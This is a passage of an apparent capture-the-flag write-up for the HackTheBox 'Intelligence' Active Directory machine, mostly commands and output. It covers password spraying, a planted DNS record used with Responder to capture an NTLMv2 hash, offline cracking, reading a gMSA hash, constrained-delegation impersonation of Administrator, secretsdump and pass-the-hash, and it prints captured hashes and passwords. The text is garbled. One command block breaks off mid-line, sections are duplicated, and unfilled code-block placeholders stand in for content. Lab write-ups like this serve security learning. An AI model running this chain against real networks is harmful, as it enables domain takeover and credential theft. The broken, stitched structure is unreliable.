File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : William.Lee
======== ./2020-06-15-upload.pdf
ExifTool Version Number         : 13.55
File Name                       : 2020-06-15-upload.pdf
Directory                       : .
File Size                       : 27 kB
File Modification Date/Time     : 2021:04:01 13:00:00-04:00
File Access Date/Time           : 2026:09:10 16:55:10-04:00
File Inode Change Date/Time     : 2026:09:10 16:55:10-04:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : Stephanie.Young
======== ./2020-06-21-upload.pdf
ExifTool Version Number         : 13.55
File Name                       : 2020-06-21-upload.pdf
Directory                       : .
File Size                       : 26 kB
File Modification Date/Time     : 2021:04:01 13:00:00-04:00
File Access Date/Time           : 2026:09:10 16:55:12-04:00
File Inode Change Date/Time     : 2026:09:10 16:55:12-04:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : David.Reed
======== ./2020-06-22-upload.pdf
ExifTool Version Number         : 13.55
File Name                       : 2020-06-22-upload.pdf
Directory                       : .
File Size                       : 26 kB
File Modification Date/Time     : 2021:04:01 13:00:00-04:00
File Access Date/Time           : 2026:09:10 16:55:12-04:00
File Inode Change Date/Time     : 2026:09:10 16:55:12-04:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : Nicole.Brock
======== ./2020-06-25-upload.pdf
ExifTool Version Number         : 13.55
File Name                       : 2020-06-25-upload.pdf
Directory                       : .
File Size                       : 11 kB
File Modification Date/Time     : 2021:04:01 13:00:00-04:00
File Access Date/Time           : 2026:09:10 16:55:11-04:00
File Inode Change Date/Time     : 2026:09:10 16:55:11-04:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : David.Mcbride

```
Running it on every file we see each one has a different user. We can use `grep` and `awk` to extract each username from the metadata from each file and create a user list.

```zsh
┌──(kali㉿kali)-[~/…/HTB/intelligence/files/pdfs]
└─$ exiftool ./* | grep -ia 'creator' | awk '{print $3}'
William.Lee
Scott.Scott
Jason.Wright
Veronica.Patel
Jennifer.Thomas
Danny.Matthews
David.Reed
Stephanie.Young
Daniel.Shelton
Jose.Williams
John.Coleman
Jason.Wright
Jose.Williams
Daniel.Shelton
Brian.Morris
Jennifer.Thomas
Thomas.Valenzuela
Travis.Evans
Samuel.Richardson
Richard.Williams
David.Mcbride
Jose.Williams
John.Coleman
William.Lee
Anita.Roberts
Brian.Baker
Jose.Williams
David.Mcbride
Kelly.Long
John.Coleman
Jose.Williams
Nicole.Brock
Thomas.Valenzuela
David.Reed
Kaitlyn.Zimmerman
Jason.Patterson
Thomas.Valenzuela
David.Mcbride
Darryl.Harris
William.Lee
Stephanie.Young
David.Reed
Nicole.Brock
David.Mcbride
William.Lee
Stephanie.Young
John.Coleman
David.Wilson
Scott.Scott
Teresa.Williamson
John.Coleman
Veronica.Patel
John.Coleman
Samuel.Richardson
Ian.Duncan
Nicole.Brock
William.Lee
Jason.Wright
Travis.Evans
David.Mcbride
Jessica.Moody
Ian.Duncan
Jason.Wright
Richard.Williams
Tiffany.Molina
Jose.Williams
Jessica.Moody
Brian.Baker
```

```zsh
---SNIP---
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Nicole.Brock:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Stephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\David.Wilson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Teresa.Williamson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Veronica.Patel:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Nicole.Brock:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Travis.Evans:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Jessica.Moody:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Richard.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 

```
We password spray our known default password in conjunction with our known user list and get access to the machine as `Tiffany.Molina`.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/intelligence/files]
└─$ nxc smb DC.intelligence.htb -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' --shares
SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.95.154   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
SMB         10.129.95.154   445    DC               [*] Enumerated shares
SMB         10.129.95.154   445    DC               Share           Permissions     Remark
SMB         10.129.95.154   445    DC               -----           -----------     ------
SMB         10.129.95.154   445    DC               ADMIN$                          Remote Admin
SMB         10.129.95.154   445    DC               C$                              Default share
SMB         10.129.95.154   445    DC               IPC$            READ            Remote IPC
SMB         10.129.95.154   445    DC               IT              READ            
SMB         10.129.95.154   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.95.154   445    DC               SYSVOL          READ            Logon server share 
SMB         10.129.95.154   445    DC               Users           READ
```
From her access we see she has read permissions on `Users` and `IT` shares which appear to be non-standard shares.

```zsh
└─$ smbclient -U intelligence.htb/Tiffany.Molina%NewIntelligenceCorpUser9876 \\\\DC.intelligence.htb\\IT
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Apr 18 20:50:55 2021
  ..                                  D        0  Sun Apr 18 20:50:55 2021
  downdetector.ps1                    A     1046  Sun Apr 18 20:50:55 2021

		3770367 blocks of size 4096. 1434291 blocks available
smb: \> 
```
Inside the `IT` share we see `downdetector.ps1` which is Ted's script to detect website outages.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/intelligence/files]
└─$ smbclient -U intelligence.htb/Tiffany.Molina%NewIntelligenceCorpUser9876 \\\\DC.intelligence.htb\\Users
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Sun Apr 18 21:20:26 2021
  ..                                 DR        0  Sun Apr 18 21:20:26 2021
  Administrator                       D        0  Sun Apr 18 20:18:39 2021
  All Users                       DHSrn        0  Sat Sep 15 03:21:46 2018
  Default                           DHR        0  Sun Apr 18 22:17:40 2021
  Default User                    DHSrn        0  Sat Sep 15 03:21:46 2018
  desktop.ini                       AHS      174  Sat Sep 15 03:11:27 2018
  Public                             DR        0  Sun Apr 18 20:18:39 2021
  Ted.Graves                          D        0  Sun Apr 18 21:20:26 2021
  Tiffany.Molina                      D        0  Sun Apr 18 20:51:46 2021

		3770367 blocks of size 4096. 1434275 blocks available
smb: \> cd Tiffany.Molina
smb: \Tiffany.Molina\> dir
  .                                   D        0  Sun Apr 18 20:51:46 2021
  ..                                  D        0  Sun Apr 18 20:51:46 2021
  AppData                            DH        0  Sun Apr 18 20:51:46 2021
  Application Data                DHSrn        0  Sun Apr 18 20:51:46 2021
  Cookies                         DHSrn        0  Sun Apr 18 20:51:46 2021
  Desktop                            DR        0  Sun Apr 18 20:51:46 2021
  Documents                          DR        0  Sun Apr 18 20:51:46 2021
  Downloads                          DR        0  Sat Sep 15 03:12:33 2018
  Favorites                          DR        0  Sat Sep 15 03:12:33 2018
  Links                              DR        0  Sat Sep 15 03:12:33 2018
  Local Settings                  DHSrn        0  Sun Apr 18 20:51:46 2021
  Music                              DR        0  Sat Sep 15 03:12:33 2018
  My Documents                    DHSrn        0  Sun Apr 18 20:51:46 2021
  NetHood                         DHSrn        0  Sun Apr 18 20:51:46 2021
  NTUSER.DAT                        AHn   131072  Thu Sep 10 21:09:28 2026
  ntuser.dat.LOG1                   AHS    86016  Sun Apr 18 20:51:46 2021
  ntuser.dat.LOG2                   AHS        0  Sun Apr 18 20:51:46 2021
  NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TM.blf    AHS    65536  Sun Apr 18 20:51:46 2021
  NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Sun Apr 18 20:51:46 2021
  NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Sun Apr 18 20:51:46 2021
  ntuser.ini                        AHS       20  Sun Apr 18 20:51:46 2021
  Pictures                           DR        0  Sat Sep 15 03:12:33 2018
  Recent                          DHSrn        0  Sun Apr 18 20:51:46 2021
  Saved Games                         D        0  Sat Sep 15 03:12:33 2018
  SendTo                          DHSrn        0  Sun Apr 18 20:51:46 2021
  Start Menu                      DHSrn        0  Sun Apr 18 20:51:46 2021
  Templates                       DHSrn        0  Sun Apr 18 20:51:46 2021
  Videos                             DR        0  Sat Sep 15 03:12:33 2018

		3770367 blocks of size 4096. 1434275 blocks available
smb: \Tiffany.Molina\> cd Desktop
smb: \Tiffany.Molina\Desktop\> dir
  .                                  DR        0  Sun Apr 18 20:51:46 2021
  ..                                 DR        0  Sun Apr 18 20:51:46 2021
  user.txt                           AR       34  Thu Sep 10 21:00:05 2026

		3770367 blocks of size 4096. 1434275 blocks available
smb: \Tiffany.Molina\Desktop\> get user.txt 
getting file \Tiffany.Molina\Desktop\user.txt of size 34 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
```
Inside the `Users` share we see our own user folder with `user.txt` flag sitting on their Desktop. 

```zsh
──(kali㉿kali)-[~/…/HTB/intelligence/files/bloodhound]
└─$ nxc smb DC.intelligence.htb -u "Tiffany.Molina" -p 'NewIntelligenceCorpUser9876' --users                                            
SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.95.154   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
SMB         10.129.95.154   445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.95.154   445    DC               Administrator                 2021-04-19 00:18:37 0       Built-in account for administering the computer/domain 
SMB         10.129.95.154   445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.129.95.154   445    DC               krbtgt                        2021-04-19 00:42:42 0       Key Distribution Center Service Account 
SMB         10.129.95.154   445    DC               Danny.Matthews                2021-04-19 00:49:34 0        
SMB         10.129.95.154   445    DC               Jose.Williams                 2021-04-19 00:49:35 0        
SMB         10.129.95.154   445    DC               Jason.Wright                  2021-04-19 00:49:36 0        
SMB         10.129.95.154   445    DC               Samuel.Richardson             2021-04-19 00:49:37 0        
SMB         10.129.95.154   445    DC               David.Mcbride                 2021-04-19 00:49:37 0        
SMB         10.129.95.154   445    DC               Scott.Scott                   2021-04-19 00:49:38 0        
SMB         10.129.95.154   445    DC               David.Reed                    2021-04-19 00:49:38 0        
SMB         10.129.95.154   445    DC               Ian.Duncan                    2021-04-19 00:49:38 0        
SMB         10.129.95.154   445    DC               Michelle.Kent                 2021-04-19 00:49:38 0        
SMB         10.129.95.154   445    DC               Jennifer.Thomas               2021-04-19 00:49:38 0        
SMB         10.129.95.154   445    DC               Kaitlyn.Zimmerman             2021-04-19 00:49:38 0        
SMB         10.129.95.154   445    DC               Travis.Evans                  2021-04-19 00:49:38 0        
SMB         10.129.95.154   445    DC               Kelly.Long                    2021-04-19 00:49:38 0        
SMB         10.129.95.154   445    DC               Nicole.Brock                  2021-04-19 00:49:38 0        
SMB         10.129.95.154   445    DC               Stephanie.Young               2021-04-19 00:49:39 0        
SMB         10.129.95.154   445    DC               John.Coleman                  2021-04-19 00:49:39 0        
SMB         10.129.95.154   445    DC               Thomas.Valenzuela             2021-04-19 00:49:39 0        
SMB         10.129.95.154   445    DC               Thomas.Hall                   2021-04-19 00:49:39 0        
SMB         10.129.95.154   445    DC               Brian.Baker                   2021-04-19 00:49:39 0        
SMB         10.129.95.154   445    DC               Richard.Williams              2021-04-19 00:49:39 0        
SMB         10.129.95.154   445    DC               Teresa.Williamson             2021-04-19 00:49:39 0        
SMB         10.129.95.154   445    DC               David.Wilson                  2021-04-19 00:49:39 0        
SMB         10.129.95.154   445    DC               Darryl.Harris                 2021-04-19 00:49:39 0        
SMB         10.129.95.154   445    DC               William.Lee                   2021-04-19 00:49:40 0        
SMB         10.129.95.154   445    DC               Thomas.Wise                   2021-04-19 00:49:40 0        
SMB         10.129.95.154   445    DC               Veronica.Patel                2021-04-19 00:49:40 0        
SMB         10.129.95.154   445    DC               Joel.Crawford                 2021-04-19 00:49:41 0        
SMB         10.129.95.154   445    DC               Jean.Walter                   2021-04-19 00:49:41 0        
SMB         10.129.95.154   445    DC               Anita.Roberts                 2021-04-19 00:49:41 0        
SMB         10.129.95.154   445    DC               Brian.Morris                  2021-04-19 00:49:41 0        
SMB         10.129.95.154   445    DC               Daniel.Shelton                2021-04-19 00:49:41 0        
SMB         10.129.95.154   445    DC               Jessica.Moody                 2021-04-19 00:49:41 0        
SMB         10.129.95.154   445    DC               Tiffany.Molina                2021-04-19 00:49:41 0        
SMB         10.129.95.154   445    DC               James.Curbow                  2021-04-19 00:49:41 0        
SMB         10.129.95.154   445    DC               Jeremy.Mora                   2021-04-19 00:49:41 0        
SMB         10.129.95.154   445    DC               Jason.Patterson               2021-04-19 00:49:41 0        
SMB         10.129.95.154   445    DC               Laura.Lee                     2021-04-19 00:49:41 0        
SMB         10.129.95.154   445    DC               Ted.Graves                    2021-04-19 00:49:42 0        
SMB         10.129.95.154   445    DC               [*] Enumerated 41 local users: intelligence
```
I also used `nxc` to generate a valid list of domain users. 

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/intelligence]
└─$ nxc ldap DC.intelligence.htb -u "Tiffany.Molina" -p 'NewIntelligenceCorpUser9876' --dns-server 10.129.95.154 --bloodhound --collection ALL
LDAP        10.129.95.154   389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:intelligence.htb) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.95.154   389    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
LDAP        10.129.95.154   389    DC               Resolved collection methods: psremote, localadmin, acl, container, dcom, objectprops, session, trusts, rdp, group
LDAP        10.129.95.154   389    DC               Done in 0M 23S
LDAP        10.129.95.154   389    DC               Compressing output into /home/kali/.nxc/logs/DC_10.129.95.154_2026-09-15_125057_bloodhound.zip
```
![Pasted image 20260915100622.png\|1295](/img/user/Pasted%20image%2020260915100622.png)
As well as generated a bloodhound collection archive to look over.

```powershell
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```
I also take a look at the `downdetector.ps1` that we grabbed from the `IT` share earlier. It appears `Ted.Graves` a member of IT staff makes a simple web request with the `-UseDefaultCredentials` flag set meaning that this script uses the credentials of whoever's session is running the script. In the case of what I assume is a scheduled task, this will likely be something that either Ted or `Administrator` runs in the background. This also may mean we can listen for it on our target.

The script details let us know more. this script is looking for any subdomain in `intelligence.htb` starting with `web`. So we can create a fake DNS entry for our attacker machine via krbgrelayx's `dnstool`.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/intelligence/files]
└─$ dnstool -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -r webfake.intelligence.htb -a add -d 10.10.14.89 10.129.95.154
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```
We successfully create a DNS record called `webfake.intelligence.htb` for our attacker machine and add it to the DNS host records on the target DC.

```zsh
└─$ sudo responder -I tun0 -wdv                                               
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[*] Tips jar:
    USDT -> 0xCc98c1D3b8cd9b717b5257827102940e4E17A19A
    BTC  -> bc1q9360jedhhmps5vpl3u05vyg4jryrl52dmazz49

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]
    DHCPv6                     [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.89]
    Responder IPv6             [fe80::5491:be4d:94d2:47b5]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-TI9H29NIA4O]
    Responder Domain Name      [H6OW.LOCAL]
    Responder DCE-RPC Port     [46539]

[*] Version: Responder 3.2.2.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>

[+] Listening for events...

[HTTP] Sending NTLM authentication request to 10.129.95.154
[HTTP] GET request from: ::ffff:10.129.95.154  URL: / 
[HTTP] NTLMv2 Client   : 10.129.95.154
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:7bb578fa5404384f:0BF94459FA27F61FA9C64C7FC3F0D539:0101000000000000EDADF49D7845DD01E3F13F55A9A2C0C20000000002000800480036004F00570001001E00570049004E002D005400490039004800320039004E004900410034004F0004001400480036004F0057002E004C004F00430041004C0003003400570049004E002D005400490039004800320039004E004900410034004F002E00480036004F0057002E004C004F00430041004C0005001400480036004F0057002E004C004F00430041004C000800300030000000000000000000000000200000349B94282BC4DD697CDB74A839FFF2B70BECA2475B5A044A644D50CF8F13E2A40A0010000000000000000000000000000000000009003A0048005400540050002F00770065006200660061006B0065002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
```
A few minutes later we receive the hash for `Ted.Graves` via `responder`.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/intelligence/loot]
└─$ john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt ted.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Mr.Teddy         (Ted.Graves)     
1g 0:00:00:02 DONE (2026-09-15 14:15) 0.3663g/s 3961Kp/s 3961Kc/s 3961KC/s Mrz.deltasigma..Morgant1
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.

┌──(kali㉿kali)-[~/CTF/HTB/intelligence/loot]
└─$ nxc smb intelligence.htb -u 'Ted.Graves' -p 'Mr.Teddy' 
SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.95.154   445    DC               [+] intelligence.htb\Ted.Graves:Mr.Teddy 

```
We successfully crack the hash for `Ted.Graves` with `jtr` in just a couple seconds and confirm the successful login with netexec.

![Pasted image 20260915111925.png](/img/user/Pasted%20image%2020260915111925.png)
Looking at our bloodhound output from earlier we see that our newly compromised user is a member of the ITSUPPORT group which can read the GMSA password for the `SVC_INT$` service/machine account which has the `AllowedToDelegate` attribute assigned to it for our target DC. This means we can use delegation to impersonate any user on the DC including `Administrator`.

## Privilege Escalation
### GMSA Password leak into Constrained Delegation
![Pasted image 20260915114558.png](/img/user/Pasted%20image%2020260915114558.png)
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/intelligence]
└─$ bloodyad --host 10.129.95.154 -d "intelligence.htb" -u "Ted.Graves" -p "Mr.Teddy" get object "SVC_INT$" --attr msDS-ManagedPassword

distinguishedName: CN=svc_int,CN=Managed Service Accounts,DC=intelligence,DC=htb
msDS-ManagedPassword.NT: 4de450f51af61cf1e67e982965aca00c
msDS-ManagedPassword.B64ENCODED: 36TueccWaZ78QzqVg5VYL8ICd7NBBV+NNZdiDc/T/D86mdeakES9XYWEsZ5hsgRnuSQOwr54Umgo9zSU+JgylwiI4oq7DxhAVy+eGoeEGtc7ke4EuPM/kn14aTpqdwaYwXA8+8x5WYO1YyJ1ofq+vKPsc7fnwQwlJyi+vVEG2rOf224NGWsHLqL1086BDMCkjhvXcUfGhQmSJJKPevX8CBBrK4utnYELW0MRxAfnPVK20cewnNOF4vyktT9O4UW67Hvpz7laVgTSQwOdIw3a1q4QucS+ynSrw5/RfCEP6/B1Q++FqiaxtUlJ/TlhGSrD4cqlNNWl29Cd+zWC/k+n3g==

```
Our first pivot from `Ted.Graves` will be into the `SVC_INT$` service account. Since we have permission to read the password for it, we can use `bloodyad` to read out the NT hash directly.

![Pasted image 20260915114848.png\|542](/img/user/Pasted%20image%2020260915114848.png)![Pasted image 20260915114911.png\|619](/img/user/Pasted%20image%2020260915114911.png)
Next, we can use this hash to performed a Constrained Delegation attack on the target DC. This will allow us to impersonate any valid user on the DC including the `Administrator` user.

```zsh
└─$ faketime '21:59' impacket-getST -spn 'WWW/dc.intelligence.htb' -impersonate 'Administrator' -altservice 'cifs' -hashes :4de450f51af61cf1e67e982965aca00c 'intelligence.htb/SVC_INT
After adjusting for clock skew, we successfully get the ST for the `Administrator` user saved to a kerberos cached credential.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/intelligence]
└─$ export KRB5CCNAME=Administrator@cifs_dc.intelligence.htb@INTELLIGENCE.HTB.ccache 

┌──(kali㉿kali)-[~/CTF/HTB/intelligence]
└─$ faketime 22:08 impacket-secretsdump -k -no-pass intelligence.htb/Administrator@dc.intelligence.htb -just-dc-user Administrator
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9075113fe16cf74f7c0f9b27e882dad3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:75dcc603f2d2f7ab8bbd4c12c0c54ec804c7535f0f20e6129acc03ae544976d6
Administrator:aes128-cts-hmac-sha1-96:9091f2d145cb1a2ea31b4aca287c16b0
Administrator:des-cbc-md5:2362bc3191f23732
[*] Cleaning up...
```
We then can use our newly minted Kerberos Cached Cred for `Administrator` with `secretsdump` to dump the hashes for Administrator.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/intelligence]
└─$ smbclient //DC.intelligence.htb/Users -U 'intelligence.htb/Administrator' --pw-nt-hash '9075113fe16cf74f7c0f9b27e882dad3'
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Sun Apr 18 21:20:26 2021
  ..                                 DR        0  Sun Apr 18 21:20:26 2021
  Administrator                       D        0  Sun Apr 18 20:18:39 2021
  All Users                       DHSrn        0  Sat Sep 15 03:21:46 2018
  Default                           DHR        0  Sun Apr 18 22:17:40 2021
  Default User                    DHSrn        0  Sat Sep 15 03:21:46 2018
  desktop.ini                       AHS      174  Sat Sep 15 03:11:27 2018
  Public                             DR        0  Sun Apr 18 20:18:39 2021
  Ted.Graves                          D        0  Sun Apr 18 21:20:26 2021
  Tiffany.Molina                      D        0  Sun Apr 18 20:51:46 2021

		3770367 blocks of size 4096. 1458538 blocks available
smb: \> cd Administrator
smb: \Administrator\> cd Desktop
smb: \Administrator\Desktop\> dir
  .                                  DR        0  Sun Apr 18 20:51:57 2021
  ..                                 DR        0  Sun Apr 18 20:51:57 2021
  desktop.ini                       AHS      282  Sun Apr 18 20:40:10 2021
  root.txt                           AR       34  Tue Sep 15 19:44:26 2026

		3770367 blocks of size 4096. 1458538 blocks available
smb: \Administrator\Desktop\>
```
With the NT hash for `Administrator` we successfully authenticate via SMB and find `root.txt` sitting on their desktop. pwned.
## Final Thoughts
>[!Takeaways]
>- When fuzzing be sure to really check the naming convention of the items you are fuzzing, or you may miss valuable data.
>- When a PowerShell script passes the `-UseDefaultCredentials` flag for a scheduled task. it's likely we can listen for that auth handshake with Responder.
>- When targeting a custom script that makes a web request on a Windows target. Use `dnstool` to add a record so that your Responder session can catch the callback.
>- When you get a ccache go for `secretsdump`. If it gives you errors, read them and try it's suggested fixes. (i.e. `-just-dc-user`). 
>- You can use `smbclient` to pass-the-hash with the `--pw-nt-hash` flag.


Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Changing service from WWW/dc.intelligence.htb@INTELLIGENCE.HTB to cifs/dc.intelligence.htb@INTELLIGENCE.HTB
[*] Saving ticket in Administrator@cifs_dc.intelligence.htb@INTELLIGENCE.HTB.ccache

```
After adjusting for clock skew, we successfully get the ST for the `Administrator` user saved to a kerberos cached credential.

{{CODE_BLOCK_20}}
We then can use our newly minted Kerberos Cached Cred for `Administrator` with `secretsdump` to dump the hashes for Administrator.

{{CODE_BLOCK_21}}
With the NT hash for `Administrator` we successfully authenticate via SMB and find `root.txt` sitting on their desktop. pwned.
## Final Thoughts
>[!Takeaways]
>- When fuzzing be sure to really check the naming convention of the items you are fuzzing, or you may miss valuable data.
>- When a PowerShell script passes the `-UseDefaultCredentials` flag for a scheduled task. it's likely we can listen for that auth handshake with Responder.
>- When targeting a custom script that makes a web request on a Windows target. Use `dnstool` to add a record so that your Responder session can catch the callback.
>- When you get a ccache go for `secretsdump`. If it gives you errors, read them and try it's suggested fixes. (i.e. `-just-dc-user`). 
>- You can use `smbclient` to pass-the-hash with the `--pw-nt-hash` flag.

